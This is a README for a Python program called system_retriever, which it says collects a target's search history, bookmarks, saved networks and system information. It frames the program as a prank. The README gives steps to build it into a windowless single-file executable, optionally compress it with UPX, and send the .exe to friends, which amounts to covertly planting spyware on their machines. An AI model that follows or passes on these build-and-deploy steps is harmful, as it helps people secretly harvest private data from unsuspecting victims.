# system_retriever

A easy to use program that grabs search history, bookmarks, saved networks, and system information from a target. This program was made to be used as a prank to scare your friends by telling them what information you know about their computer usage. I am not in wany way responsible for misuse (if possible).

Some features are only supported by Windows.

**Setup**

1. The only files you need for setup are `main.py`, just clone or paste the code into your IDE.
2. Install pyinstaller to turn the program into an executable file by running `pip install pyinstaller`
3. Run pyinstaller on the program in shell using `pyinstaller main.py --noconsole --onefile`
4. Find file path of the executable file, `\project_name\dist\`

You can now send the .exe to your friends.

**Compressing**

Since the resulted file has a size of 8.72 mb, you can compress it to 7.71 mb using UPX. 
To install UPX, 
1. Go to https://github.com/upx/upx/releases/tag/v3.96 and download the version according to your OS
2. Unzip the file and copy the path to the files, `C:\Users\your_user\Downloads\upx-3.96-win32\upx-3.96-win32`
3. Instead of running `pyinstaller main.py --noconsole --onefile`, run,
   `pyinstaller main.py --noconsole --onefile --upx-dir=YOUR COPIED PATH`

The resulting .exe should be in the same location.
